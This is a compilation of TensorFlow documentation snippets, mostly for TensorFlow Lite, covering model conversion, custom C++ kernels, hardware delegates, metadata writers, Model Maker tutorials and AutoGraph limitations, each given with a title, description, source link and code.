----------------------------------------

TITLE: Converting Keras Model with TF Text/SentencePiece Ops Python
DESCRIPTION: This snippet demonstrates how to convert a Keras model containing TensorFlow Text or SentencePiece operators to TFLite. It requires importing the relevant libraries and setting `target_spec.supported_ops` to include both `TFLITE_BUILTINS` and `SELECT_TF_OPS`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/op_select_allowlist.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
# These imports are required to load operators' definition.
import tensorflow_text as tf_text
import sentencepiece as spm

converter = tf.lite.TFLiteConverter.from_keras_model(your_model)
converter.target_spec.supported_ops = [
  tf.lite.OpsSet.TFLITE_BUILTINS, tf.lite.OpsSet.SELECT_TF_OPS
]
model_data = converter.convert()
```

----------------------------------------

TITLE: Managing Persistent Data and Temporary Tensors in TensorFlow Lite Kernels (C++)
DESCRIPTION: This snippet demonstrates the standard pattern for managing persistent data using a custom OpData struct and allocating temporary tensors in a TensorFlow Lite custom kernel. It shows how to create OpData in Init, free it in Free, allocate temporary tensors and store their indices in OpData during Prepare, and access the temporary tensor data using the stored index in Invoke.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ops_custom.md#_snippet_19

LANGUAGE: c++
CODE:
```
struct MyOpData {
  int temp_tensor_index;
  ...
};

void* Init(TfLiteOpaqueContext* context,
    const char* buffer, size_t length) {
  auto* op_data = new MyOpData{};
  ...
  return op_data;
}
void Free(TfLiteOpaqueContext* context, void* buffer) {
  ...
  delete reinterpret_cast<MyOpData*>(buffer);
}
TfLiteStatus Prepare(TfLiteOpaqueContext* context,
                     TfLiteOpaqueNode* node) {
  ...
  auto* op_data =
      reinterpret_cast<MyOpData*>(TfLiteOpaqueNodeGetUserData(node));
  const int num_temporaries = 1;
  int temporary_tensor_indices[num_temporaries];
  TfLiteOpaqueTensorBuilder* builder = TfLiteOpaqueTensorBuilderCreate();
  TfLiteOpaqueTensorBuilderSetType(builder, kTfLiteFloat32);
  TfLiteOpaqueTensorBuilderSetAllocationType(builder, kTfLiteArenaRw);
  TfLiteOpaqueContextAddTensor(context, builder,
      &temporary_tensor_indices[0]);
  TfLiteOpaqueTensorBuilderDelete(builder);
  TfLiteOpaqueNodeSetTemporaries(node, temporary_tensor_indices,
      num_temporaries);
  op_data->temp_tensor_index = temporary_tensor_indices[0];
  ...
  return kTfLiteOk;
}
TfLiteStatus Invoke(TfLiteOpaqueContext* context,
                        TfLiteOpaqueNode* node) {
  ...
  auto* op_data = reinterpret_cast<MyOpData*>(
      TfLiteOpaqueNodeGetUserData(node));
  TfLiteOpaqueTensor* temp_tensor =
      TfLiteOpaqueContextGetOpaqueTensor(context,
          op_data->temp_tensor_index);
  TF_LITE_OPAQUE_ENSURE(context,
      TfLiteTensorType(temp_tensor) == kTfLiteFloat32);
  TF_LITE_OPAQUE_ENSURE(context,
      TfLiteTensorGetAllocationType(temp_Tensor) == kTfLiteArenaRw);
  void *temp_data = TfLiteTensorData(temp_tensor);
  TF_LITE_OPAQUE_ENSURE(context, temp_data != nullptr);
  ...
  return kTfLiteOk;
}
```

----------------------------------------

TITLE: Creating TfLiteOperator Instance (C++)
DESCRIPTION: Defines the C API function signature for creating a `TfLiteOperator` instance. This function takes the operator's builtin code (usually `kTfLiteBuiltinCustom`), a string name for custom operators, and a version number.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ops_custom.md#_snippet_6

LANGUAGE: C++
CODE:
```
TfLiteOperator*
TfLiteOperatorCreate(
    TfLiteBuiltinOperator builtin_code,  // Normally `TfLiteBuiltinCustom`.
    const char* custom_name,  // The name of the custom op.
    int version  // Normally `1` for the first version of a custom op.
);
```

----------------------------------------

TITLE: Enable CoreML Delegate on All Devices (Swift)
DESCRIPTION: Configures the CoreMLDelegate in Swift with options to enable it on all devices, regardless of Neural Engine availability. This can be useful for testing or specific scenarios where Core ML is desired on older hardware or simulators.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/coreml_delegate.md#_snippet_4

LANGUAGE: Swift
CODE:
```
var options = CoreMLDelegate.Options()
    options.enabledDevices = .all
    let coreMLDelegate = CoreMLDelegate(options: options)!
    let interpreter = try Interpreter(modelPath: modelPath,
                                      delegates: [coreMLDelegate])
```

----------------------------------------

TITLE: Creating TFLite Tensor Metadata Objects - Python
DESCRIPTION: Initializes empty `TensorMetadataT` objects for both the input and output tensors of the TFLite model. These objects serve as containers for detailed information about each tensor's properties, content, and processing requirements.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/metadata.md#_snippet_3

LANGUAGE: python
CODE:
```
# Creates input info.
input_meta = _metadata_fb.TensorMetadataT()

# Creates output info.
output_meta = _metadata_fb.TensorMetadataT()
```

----------------------------------------

TITLE: Calling Custom Multiplex Op in Python
DESCRIPTION: Demonstrates the basic Python usage of the custom `multiplex_2` op after it has been built and loaded. It shows how to call the operation with the boolean condition tensor and the two value tensors.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_2/README.md#_snippet_0

LANGUAGE: python
CODE:
```
multiplex_2_op.multiplex(condition, x, y)
```

----------------------------------------

TITLE: Installing CocoaPods Dependencies Shell
DESCRIPTION: Runs the CocoaPods install command to download, install, and integrate the pods listed in the Podfile, including TensorFlowLiteObjC, into the Xcode workspace.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/objc/README.md#_snippet_2

LANGUAGE: shell
CODE:
```
pod install
```

----------------------------------------

TITLE: Registering AsyncSleep Op Interface C++
DESCRIPTION: Registers the "Examples>AsyncSleep" custom operation with TensorFlow's framework. It defines the op's name, specifies a scalar float input named "delay" and a scalar float output named "output", provides a shape inference function to ensure the input is scalar, and includes detailed documentation for the op's purpose and behavior.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/sleep/README.md#_snippet_2

LANGUAGE: c++
CODE:
```
REGISTER_OP("Examples>AsyncSleep")
    .Input("delay: float")
    .Output("output: float")
    .SetShapeFn([](tensorflow::shape_inference::InferenceContext* c) {
      tensorflow::shape_inference::ShapeHandle handle;
      TF_RETURN_IF_ERROR(c->WithRank(c->input(0), 0, &handle));
      return (ScalarOutput(c));
    })
    .Doc(R"doc(
Pause for `delay` seconds (which need not be an integer).

This is an asynchronous (non-blocking) version of sleep. It is intended to
be an example of how to implement ops that do I/O or that block on other ops.

delay: tf.Tensor which is a scalar of type float.

Returns the time spent in blocking sleep (which may be less that `delay` or
zero if other ops run while this is waiting asynchronously).
)doc");
```

----------------------------------------

TITLE: Data Preparation - MNIST Dataset
DESCRIPTION: Defines a helper function `_one_hot` to create one-hot encoded labels, then loads the MNIST dataset using TensorFlow Keras, scales the image pixel values to [0, 1], converts them to float32, and applies one-hot encoding to the labels.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/jax_conversion/jax_to_tflite.ipynb#_snippet_6

LANGUAGE: Python
CODE:
```
def _one_hot(x, k, dtype=np.float32):
  """Create a one-hot encoding of x of size k."""
  return np.array(x[:, None] == np.arange(k), dtype)

(train_images, train_labels), (test_images, test_labels) = tf.keras.datasets.mnist.load_data()
train_images, test_images = train_images / 255.0, test_images / 255.0
train_images = train_images.astype(np.float32)
test_images = test_images.astype(np.float32)

train_labels = _one_hot(train_labels, 10)
test_labels = _one_hot(test_labels, 10)
```

----------------------------------------

TITLE: Including TFLite Micro Model Header (C++)
DESCRIPTION: Includes the header file that contains the TensorFlow Lite model data. The model is typically converted into a C++ array during the build process and embedded in this header, making it available for the TFLite Micro interpreter to load.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/microcontrollers/get_started_low_level.md#_snippet_1

LANGUAGE: C++
CODE:
```
#include "tensorflow/lite/micro/examples/hello_world/model.h"
```

----------------------------------------

TITLE: Populating Metadata into Model (Python)
DESCRIPTION: This method performs the action of embedding the generated metadata and any associated files (like label files) into the TFLite model buffer. This process modifies the original model file buffer to include the new metadata structure, making the model self-contained with its descriptive information. The method returns the modified model buffer as a bytearray.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/image_classifier/MetadataWriter.md#_snippet_6

LANGUAGE: python
CODE:
```
populate() -> bytearray
```

----------------------------------------

TITLE: Evaluating TFLite Model Python
DESCRIPTION: This method evaluates a saved TFLite model file using the provided data. It requires the path to the TFLite file and the evaluation data loader, returning a dictionary of metrics.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/object_detector/ObjectDetector.md#_snippet_5

LANGUAGE: python
CODE:
```
evaluate_tflite(
    tflite_filepath: str,
    data: tflite_model_maker.object_detector.DataLoader
) -> Dict[str, float]
```

----------------------------------------

TITLE: Creating Keras Serving Model (Python)
DESCRIPTION: Returns the underlying Keras model specifically configured for serving predictions. This model is optimized for inference tasks.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/text_classifier/TextClassifier.md#_snippet_3

LANGUAGE: python
CODE:
```
create_serving_model()
```

----------------------------------------

TITLE: Registering Custom Op Kernels C++
DESCRIPTION: Registers the C++ kernel implementations (`AsyncSleepOp` and `SyncSleepOp`) for the "Examples>AsyncSleep" and "Examples>SyncSleep" custom operations, respectively, specifically targeting the CPU device. This step connects the graph definition of the op to the actual executable C++ code that performs the computation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/sleep/README.md#_snippet_4

LANGUAGE: c++
CODE:
```
REGISTER_KERNEL_BUILDER(
    Name("Examples>AsyncSleep").Device(::tensorflow::DEVICE_CPU), AsyncSleepOp)
REGISTER_KERNEL_BUILDER(
    Name("Examples>SyncSleep").Device(::tensorflow::DEVICE_CPU), SyncSleepOp)
```

----------------------------------------

TITLE: Initializing Question Answer DataLoader (Python)
DESCRIPTION: Initializes a `DataLoader` instance for question answering tasks. It wraps a `tf.data.Dataset` along with metadata like its size, version information (for SQuAD 2.0), and potentially preprocessed examples and features derived from a SQuAD file.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/question_answer/DataLoader.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_model_maker.question_answer.DataLoader(
    dataset, size, version_2_with_negative, examples, features, squad_file
)
```

----------------------------------------

TITLE: Creating and Populating Detailed Image Classifier Metadata (Python)
DESCRIPTION: Uses the `create_from_metadata_info` method of the `ImageClassifierWriter` to generate rich metadata for the model. It takes the model buffer and the previously created detailed metadata information objects (`general_md`, `input_md`, `output_md`) as input. After creating the writer, it prints the generated metadata JSON for verification and then saves the model with the populated, detailed metadata to the specified path.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/metadata_writer_tutorial.ipynb#_snippet_21

LANGUAGE: Python
CODE:
```
ImageClassifierWriter = image_classifier.MetadataWriter
# Create the metadata writer.
writer = ImageClassifierWriter.create_from_metadata_info(
    model_buffer, general_md, input_md, output_md)

# Verify the metadata generated by the metadata writer.
print(writer.get_metadata_json())

# Populate the metadata into the model.
writer_utils.save_file(writer.populate(), _SAVE_TO_PATH)
```

----------------------------------------

TITLE: Initializing and Using TFLite Hexagon Delegate in C++
DESCRIPTION: Demonstrates the basic steps for integrating the TFLite Hexagon delegate into a C++ application. It covers initializing the Hexagon library, creating delegate options and the delegate instance, attaching the delegate to a TFLite interpreter, and cleaning up resources. Requires linking against the `hexagon_delegate` rule and ensuring the necessary shared libraries are accessible at runtime.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/hexagon/README.md#_snippet_0

LANGUAGE: C++
CODE:
```
#include "tensorflow/lite/delegates/hexagon/hexagon_delegate.h"

  // Assuming shared libraries are under "/data/local/tmp/"
  // If files are packaged with native lib in android App then it
  // will typically be equivalent to the path provided by
  // "getContext().getApplicationInfo().nativeLibraryDir"
  const char[] library_directory_path = "/data/local/tmp/";
  TfLiteHexagonInitWithPath(library_directory_path);  // Needed once at startup.
  ::tflite::TfLiteHexagonDelegateOptions params = {0};
  // 'delegate_ptr' Need to outlive the interpreter. For example,
  // If use case will need to resize input or anything that can trigger
  // re-applying delegates then 'delegate_ptr' need to outlive the interpreter.
  auto* delegate_ptr = ::tflite::TfLiteHexagonDelegateCreate(&params);
  Interpreter::TfLiteDelegatePtr delegate(delegate_ptr,
      [](TfLiteDelegate* delegate) {
        ::tflite::TfLiteHexagonDelegateDelete(delegate);
      });
  interpreter->ModifyGraphWithDelegate(delegate.get());
  // IMPORTANT: AllocateTensors can be called only after ModifyGraphWithDelegate
  TfLiteHexagonTearDown();  // Needed once at end of app/DSP usage.
```

----------------------------------------

TITLE: Retrieve TFLite Input Tensor Types (Python)
DESCRIPTION: This Python function retrieves the data types of the input tensors from a TensorFlow Lite model represented as a bytearray. It takes the model buffer as input and returns a list of `_schema_fb.TensorType` objects, each corresponding to an input tensor's type.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/writer_utils/get_input_tensor_types.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_writers.writer_utils.get_input_tensor_types(
    model_buffer: bytearray
) -> List[_schema_fb.TensorType]
```

----------------------------------------

TITLE: Resetting Model Variables in TFLite Python
DESCRIPTION: Resets all stateful variables within the TFLite model to their initial values. This is typically used for models that maintain internal state between invocations, allowing for a clean start.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tf/lite/Interpreter.md#_snippet_14

LANGUAGE: python
CODE:
```
reset_all_variables()
```

----------------------------------------

TITLE: Configuring Debugger Options with Custom Metrics (Python)
DESCRIPTION: Configures the Quantization Debugger options with custom metric functions for detailed analysis. Metrics can be defined for layer-wise differences (`layer_debug_metrics`), raw tensor comparisons (`layer_direct_compare_metrics`), or overall model output comparison (`model_debug_metrics`). Requires NumPy.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/quantization_debugger.ipynb#_snippet_20

LANGUAGE: python
CODE:
```
debug_options = tf.lite.experimental.QuantizationDebugOptions(
    layer_debug_metrics={
        'mean_abs_error': (lambda diff: np.mean(np.abs(diff)))
    },
    layer_direct_compare_metrics={
        'correlation':
            lambda f, q, s, zp: (np.corrcoef(f.flatten(),
                                             (q.flatten() - zp) / s)[0, 1])
    },
    model_debug_metrics={
        'argmax_accuracy': (lambda f, q: np.mean(np.argmax(f) == np.argmax(q)))
    })

debugger = tf.lite.experimental.QuantizationDebugger(
    converter=converter,
    debug_dataset=representative_dataset(ds),
    debug_options=debug_options)
```

----------------------------------------

TITLE: Run TensorFlow Lite Demo on Desktop
DESCRIPTION: Executes the built label_image binary on a desktop machine using the downloaded MobileNet model, labels, and a sample image. Specify the paths to the .tflite model, labels.txt file, and the input image.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/label_image/README.md#_snippet_5

LANGUAGE: shell
CODE:
```
bazel-bin/tensorflow/lite/examples/label_image/label_image \
  --tflite_model /tmp/mobilenet_v1_1.0_224.tflite \
  --labels /tmp/labels.txt \
  --image tensorflow/lite/examples/label_image/testdata/grace_hopper.bmp
```

----------------------------------------

TITLE: Applying Experimental 16x8 Quantization (Python)
DESCRIPTION: This snippet implements the experimental 16x8 integer quantization. It requires a representative dataset for calibration and sets the `supported_ops` in `target_spec` to `EXPERIMENTAL_TFLITE_BUILTINS_ACTIVATIONS_INT16_WEIGHTS_INT8`. This technique aims to improve accuracy compared to 8-bit integer quantization, especially for certain model types.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_quantization.md#_snippet_7

LANGUAGE: Python
CODE:
```
import tensorflow as tf
converter = tf.lite.TFLiteConverter.from_saved_model(saved_model_dir)
converter.representative_dataset = representative_dataset
converter.optimizations = [tf.lite.Optimize.DEFAULT]
converter.target_spec.supported_ops = [tf.lite.OpsSet.EXPERIMENTAL_TFLITE_BUILTINS_ACTIVATIONS_INT16_WEIGHTS_INT8]
tflite_quant_model = converter.convert()
```

----------------------------------------

TITLE: Install Dependencies via Shell
DESCRIPTION: Executes shell commands within the notebook environment to install necessary system libraries ('libportaudio2' for audio playback) and the 'tflite-model-maker' Python package required for the tutorial.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/audio_classification.ipynb#_snippet_1

LANGUAGE: shell
CODE:
```
!sudo apt -y install libportaudio2
!pip install tflite-model-maker
```

----------------------------------------

TITLE: Initializing StaticHashTable (string->int64) with Tensors - Python
DESCRIPTION: Demonstrates creating a tf.lookup.StaticHashTable mapping strings to int64s using KeyValueTensorInitializer with tensors. It sets up tensors for keys and values, initializes the table, creates a placeholder for string input, and defines the lookup operation within a control dependency for table initialization.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/kernels/hashtable.md#_snippet_0

LANGUAGE: Python
CODE:
```
int64_values = tf.constant([1, 2, 3], dtype=tf.int64)
string_values = tf.constant(['bar', 'foo', 'baz'], dtype=tf.string)

initializer = tf.lookup.KeyValueTensorInitializer(string_values, int64_values)
table = tf.lookup.StaticHashTable(initializer, 4)

with tf.control_dependencies([tf.initializers.tables_initializer()]):
  input_string_tensor = tf.compat.v1.placeholder(tf.string, shape=[1])
  out_int64_tensor = table.lookup(input_string_tensor)
```

----------------------------------------

TITLE: Run TensorFlow Lite Demo with NNAPI Accelerator on Android
DESCRIPTION: Executes the label_image binary on Android via `adb shell`, enabling the Hexagon delegate ('-j 1') and also specifying a particular NNAPI accelerator (e.g., 'google-edgetpu') using the delegate registrar options. This demonstrates combining delegates and targeting specific hardware.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/label_image/README.md#_snippet_12

LANGUAGE: shell
CODE:
```
adb shell \
    "/data/local/tmp/label_image \
    -m /data/local/tmp/mobilenet_v1_1.0_224_quant.tflite \
    -i /data/local/tmp/grace_hopper.bmp \
    -l /data/local/tmp/labels.txt -j 1 \
    --use_nnapi=true --nnapi_accelerator_name=google-edgetpu"
```

----------------------------------------

TITLE: Implementing Custom Operator Methods (C Example)
DESCRIPTION: Shows how to implement custom operator methods (`Init`, `Free`, `Prepare`, `Invoke`) in C using static functions and a consistent function name prefix based on the operator's name. This follows typical C conventions for organizing related functions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ops_custom.md#_snippet_9

LANGUAGE: C
CODE:
```
void* MyCustomOpInit(TfLiteOpaqueContext* context,
                     const char* buffer, size_t length) { ... }
// ... plus definitions of MyCustomOpFree, MyCustomOpPrepare, and
// MyCustomOpInvoke.
```

----------------------------------------

TITLE: Handling None Values in tf.cond - Incorrect
DESCRIPTION: TensorFlow tensors cannot hold None values. This snippet demonstrates an incorrect attempt to assign None to a tensor conditionally within a `tf.cond` block, which will result in an error during graph construction.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_0

LANGUAGE: python
CODE:
```
x = tf.cond(
    tf.random.uniform(()) > 0.5,
    lambda: tf.constant(1),
    lambda: None)  # Error -- a Tensor cannot be None
```

----------------------------------------

TITLE: Preventing .tflite File Compression (Gradle)
DESCRIPTION: Configures `aaptOptions` in an Android module's build.gradle file to prevent the Android Asset Packaging Tool (aapt) from compressing `.tflite` files. This is necessary for models to be opened as file descriptors and is sometimes needed as a troubleshooting step. Note: This is often not needed in Android Gradle Plugin versions 4.1 and above.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/codegen.md#_snippet_6

LANGUAGE: Gradle
CODE:
```
aaptOptions {
   noCompress "tflite"
}
```

----------------------------------------

TITLE: Populating Metadata into Model File (Python)
DESCRIPTION: Embeds the generated metadata and associated label files directly into the model file buffer. This method returns a new bytearray representing the complete model file with the metadata and associated files included.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/audio_classifier/MetadataWriter.md#_snippet_7

LANGUAGE: python
CODE:
```
populate() -> bytearray\n
```

----------------------------------------

TITLE: Pushing TFLite Model Android ADB
DESCRIPTION: Use this `adb push` command to copy the TFLite model file you intend to test from your local machine to the same temporary directory (`/data/local/tmp`) on the Android device. The tool requires the model file path to be accessible on the device.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/evaluation/tasks/inference_diff/README.md#_snippet_2

LANGUAGE: bash
CODE:
```
adb push mobilenet_v1_1.0_224.tflite /data/local/tmp
```

----------------------------------------

TITLE: Loading Text Data for Searcher Model (Python)
DESCRIPTION: Initializes a TextDataLoader instance using the downloaded TFLite embedder model. It then loads the dataset from a CSV file, specifying the column names for the text content (used for embeddings) and the associated metadata (to be returned with search results).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/text_searcher.ipynb#_snippet_4

LANGUAGE: python
CODE:
```
data_loader = searcher.TextDataLoader.create("universal_sentence_encoder.tflite", l2_normalize=True)
data_loader.load_from_csv("cnn_dailymail.csv", text_column="highlights", metadata_column="urls")
```

----------------------------------------

TITLE: Defining TensorFlow Lite Model Constants - Kotlin
DESCRIPTION: Defines constant values required for the TensorFlow Lite BERT Question Answerer setup, including the model file name and integer identifiers for different hardware delegates (CPU, GPU, NNAPI). These constants are typically part of a companion object within the helper class for easy access.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/question_answer.md#_snippet_1

LANGUAGE: Kotlin
CODE:
```
companion object {
 private const val BERT_QA_MODEL = "mobilebert.tflite"
 private const val TAG = "BertQaHelper"
 const val DELEGATE_CPU = 0
 const val DELEGATE_GPU = 1
 const val DELEGATE_NNAPI = 2
}
```

----------------------------------------

TITLE: Downloading Flower Dataset Python
DESCRIPTION: Downloads the 'flower_photos' dataset (a tar.gz file) from a Google Cloud Storage URL using tf.keras.utils.get_file, extracts it, and constructs the local path to the extracted directory. This dataset is used for the image classification example.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/image_classification.ipynb#_snippet_2

LANGUAGE: python
CODE:
```
image_path = tf.keras.utils.get_file(
      'flower_photos.tgz',
      'https://storage.googleapis.com/download.tensorflow.org/example_images/flower_photos.tgz',
      extract=True)
image_path = os.path.join(os.path.dirname(image_path), 'flower_photos')
```

----------------------------------------

TITLE: Retrieving Keras Model for Serving - Python TensorFlow
DESCRIPTION: Provides access to the trained Keras model instance which can be used for inference or serving purposes.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/image_classifier/ImageClassifier.md#_snippet_3

LANGUAGE: Python
CODE:
```
create_serving_model()
```

----------------------------------------

TITLE: Using Custom Generator with TF Dataset (Python)
DESCRIPTION: This code defines and uses a custom Python generator function `my_iterator` that wraps a TensorFlow Dataset. AutoGraph cannot convert custom generators, forcing the `for` loop to execute as a Python loop. This can lead to a 'Large unrolled loop detected' warning if the loop iterates over many items, even if the underlying data source is a TF Dataset.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/common_errors.md#_snippet_1

LANGUAGE: Python
CODE:
```
def my_iterator(ds):
  for data in ds:
    yield data

# Custom iterators always dispatch to a Python for loop.
for x in my_iterator(tf.data.Dataset.range(10)):
  tf.print(x)
```

----------------------------------------

TITLE: Choosing Model Specification (Python)
DESCRIPTION: Selects the specific pre-trained model architecture to use for the question answering task using `model_spec.get()`. In this example, 'mobilebert_qa_squad' is chosen, which is a MobileBERT model pre-trained on the SQuAD dataset, suitable for faster convergence.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/question_answer.ipynb#_snippet_4

LANGUAGE: python
CODE:
```
spec = model_spec.get('mobilebert_qa_squad')
```

----------------------------------------

TITLE: Running Style Prediction Model with TensorFlow Lite (Python)
DESCRIPTION: Defines the `run_style_predict` function which loads the style prediction TensorFlow Lite model. It initializes the TFLite interpreter, sets the preprocessed style image as the input tensor, runs inference, and retrieves the output tensor which is the 100-dimensional style bottleneck vector. This vector encapsulates the artistic style characteristics. Requires the TensorFlow Lite interpreter and the preprocessed style image (shape 1x256x256x3).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/style_transfer/overview.ipynb#_snippet_5

LANGUAGE: python
CODE:
```
# Function to run style prediction on preprocessed style image.
def run_style_predict(preprocessed_style_image):
  # Load the model.
  interpreter = tf.lite.Interpreter(model_path=style_predict_path)

  # Set model input.
  interpreter.allocate_tensors()
  input_details = interpreter.get_input_details()
  interpreter.set_tensor(input_details[0]["index"], preprocessed_style_image)

  # Calculate style bottleneck.
  interpreter.invoke()
  style_bottleneck = interpreter.tensor(
      interpreter.get_output_details()[0]["index"]
      )()

  return style_bottleneck

# Calculate style bottleneck for the preprocessed style image.
style_bottleneck = run_style_predict(preprocessed_style_image)
print('Style Bottleneck Shape:', style_bottleneck.shape)
```

----------------------------------------

TITLE: Applying Collapse Operation in XLA C++
DESCRIPTION: Demonstrates how to use the `Collapse` operation in XLA. It shows examples of collapsing different sets of dimensions (all, lower two, higher two) of a 3D array, illustrating the syntax and the resulting array shapes and element ordering.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/operation_semantics.md#_snippet_7

LANGUAGE: C++
CODE:
```
let v = f32[4x2x3] {{{10, 11, 12},  {15, 16, 17}},
{{20, 21, 22},  {25, 26, 27}},
{{30, 31, 32},  {35, 36, 37}},
{{40, 41, 42},  {45, 46, 47}}};

// Collapse to a single dimension, leaving one dimension.
let v012 = Collapse(v, {0,1,2});
then v012 == f32[24] {10, 11, 12, 15, 16, 17,
20, 21, 22, 25, 26, 27,
30, 31, 32, 35, 36, 37,
40, 41, 42, 45, 46, 47};

// Collapse the two lower dimensions, leaving two dimensions.
let v01 = Collapse(v, {0,1});
then v01 == f32[4x6] {{10, 11, 12, 15, 16, 17},
{20, 21, 22, 25, 26, 27},
{30, 31, 32, 35, 36, 37},
{40, 41, 42, 45, 46, 47}};

// Collapse the two higher dimensions, leaving two dimensions.
let v12 = Collapse(v, {1,2});
then v12 == f32[8x3] {{10, 11, 12},
{15, 16, 17},
{20, 21, 22},
{25, 26, 27},
{30, 31, 32},
{35, 36, 37},
{40, 41, 42},
{45, 46, 47}};
```

----------------------------------------

TITLE: Initialize TfLiteVision Service with Listeners - Kotlin
DESCRIPTION: Calls the `TfLiteVision.initialize()` method with the configured options to initialize the TensorFlow Lite runtime using Google Play services. It includes success and failure listeners to handle the outcome, providing a fallback to CPU initialization if GPU fails.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/quickstart.md#_snippet_4

LANGUAGE: Kotlin
CODE:
```
TfLiteVision.initialize(context, options).addOnSuccessListener {
    objectDetectorListener.onInitialized()
}.addOnFailureListener {
    // Called if the GPU Delegate is not supported on the device
    TfLiteVision.initialize(context).addOnSuccessListener {
        objectDetectorListener.onInitialized()
    }.addOnFailureListener{
        objectDetectorListener.onError("TfLiteVision failed to initialize: "
                + it.message)
    }
}
```

----------------------------------------

TITLE: Checking for Static vs Dynamic Shape with Python If Python
DESCRIPTION: Provides a method to write code that handles both static and dynamic shapes by using a Python `if` statement to check if the static shape component (`x.shape[0]`) is `None`. This allows selecting different code paths (e.g., using `x.shape` vs `tf.shape`) before tracing occurs. Requires TensorFlow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_38

LANGUAGE: Python
CODE:
```
if x.shape[0] is None:  # Python bool, does not use tf.cond
  # ... use x.shape here ...
else:
  # ... use tf.shape(x) here ...
```

----------------------------------------

TITLE: Processing and Relabeling Dataset
DESCRIPTION: This snippet defines and calls a function `replace_label` to process the downloaded SST-2 dataset. It reads the TSV files ('train.tsv', 'dev.tsv') using pandas, replaces the integer labels (0 and 1) with descriptive strings ('negative', 'positive'), and saves the updated data as CSV files ('train.csv', 'dev.csv').
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/text_classification.ipynb#_snippet_4

LANGUAGE: python
CODE:
```
import pandas as pd

def replace_label(original_file, new_file):
  # Load the original file to pandas. We need to specify the separator as
  # '\t' as the training data is stored in TSV format
  df = pd.read_csv(original_file, sep='\t')

  # Define how we want to change the label name
  label_map = {0: 'negative', 1: 'positive'}

  # Excute the label change
  df.replace({'label': label_map}, inplace=True)

  # Write the updated dataset to a new file
  df.to_csv(new_file)

# Replace the label name for both the training and test dataset. Then write the
# updated CSV dataset to the current folder.
replace_label(os.path.join(os.path.join(data_dir, 'train.tsv')), 'train.csv')
replace_label(os.path.join(os.path.join(data_dir, 'dev.tsv')), 'dev.csv')
```

----------------------------------------

TITLE: Play and Display Audio Sample Details in Python
DESCRIPTION: This code defines functions to randomly select a WAV audio file from a directory structure and to load, print details (class, path, sample rate, length), plot the waveform, and play the audio sample.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/speech_recognition.ipynb#_snippet_9

LANGUAGE: python
CODE:
```
def get_random_audio_file(samples_dir):
  files = os.path.abspath(os.path.join(samples_dir, '*/*.wav'))
